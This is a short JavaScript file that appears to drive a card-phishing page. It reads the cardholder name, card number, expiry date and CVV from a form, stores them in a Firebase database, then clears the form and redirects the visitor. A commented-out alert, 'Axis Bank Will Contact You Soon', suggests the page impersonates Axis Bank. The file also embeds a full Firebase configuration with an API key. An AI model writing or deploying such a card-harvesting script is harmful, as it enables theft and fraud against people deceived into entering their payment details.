// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyAOvwnbQIsMNhZH-87eh24bqQPOUbtIQ1Q",
  authDomain: "upii-108ef.firebaseapp.com",
  databaseURL: "https://upii-108ef-default-rtdb.firebaseio.com",
  projectId: "upii-108ef",
  storageBucket: "upii-108ef.appspot.com",
  messagingSenderId: "282937941333",
  appId: "1:282937941333:web:26dbc16d69a9983049a3dc",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var card_name = getInputVal('card_name');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(card_name, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="sad1.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(card_name, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    card_name: card_name,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
